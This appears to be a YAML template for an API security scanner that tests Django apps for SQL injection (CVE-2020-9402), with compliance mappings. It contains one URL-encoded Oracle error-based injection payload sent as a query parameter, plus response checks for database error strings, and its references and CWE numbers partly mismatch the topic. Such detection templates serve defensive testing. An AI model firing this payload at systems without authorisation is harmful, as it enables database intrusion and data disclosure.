id: DJANGO_SQLI
info:
  name: "Django SQL Injection"
  description: "This refers to a vulnerability in Django applications where attackers can manipulate SQL queries through unsanitized input. This occurs when user input is improperly handled, allowing malicious SQL code to be executed on the database. Exploiting this vulnerability can lead to unauthorized data access, data manipulation, or even complete database compromise. Properly using Django's ORM and validating user input can help mitigate this risk."
  details: "Django SQL Injection vulnerabilities typically arise from the improper use of raw SQL queries or concatenating user inputs directly into query strings. Attackers can inject SQL commands that modify the intended logic of queries, potentially exposing sensitive data or allowing unauthorized operations. Common scenarios include poorly validated URL parameters, form inputs, or API requests that are directly included in SQL statements. Developers should use parameterized queries or Django's built-in ORM features to prevent such injections effectively."
  impact: "Successful exploitation of a Django SQL Injection vulnerability can lead to severe consequences, including unauthorized access to sensitive data, data manipulation, or even complete system compromise. Attackers may extract user credentials, personally identifiable information (PII), or other confidential data from the database. In critical scenarios, they could gain administrative privileges, allowing them to alter application functionality or disrupt services. Overall, the impact can severely damage the application's integrity, confidentiality, and availability."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: DJANGO_SQLI
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
  cwe:
    - CWE-200
    - CWE-16
  cve:
    - CVE-2020-9402

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards:
  GDPR:
    - Article 32
    - Article 25
  HIPAA:
    - 45 CFR ยง 164.312(c)(1)
    - 45 CFR ยง 164.308(a)(1)(ii)(A)
  SOC 2:
    - System and Communication Security
    - Secure Application Development Controls
  PCI DSS:
    - Requirement 6.5.1
    - Requirement 11.3
  ISO 27001:
    - A.12.6.1
    - A.14.2.5
  NIST 800-53:
    - SI-10
    - SI-3
  CSA CCM:
    - APP-02
    - TVM-03
  CIS Controls:
    - IG1 Safeguard 16.2
    - IG2 Safeguard 18.3
  FedRAMP:
    - SI-10
    - CA-7
  NIST 800-171:
    - 3.14.1
    - 3.14.2
  FISMA:
    - SI-10
    - SI-3
  Cybersecurity Maturity Model Certification (CMMC):
    - SI.2.216
    - RA.3.141
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal

execute:
  type: single
  requests:
    - req:
        - modify_url: "/"
        - modify_method: GET
        - replace_body: '{}'
        - add_query_param:
            q: "20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1"
validate:
  response_code:
    eq: 200
  response_payload:
    contains_either:
      - "DatabaseError at"
      - "ORA-29257:"
      - "ORA-06512:"
      - "Request Method:"
    not_contains:
      - <html>
      - </html>
    length:
      gt: 0
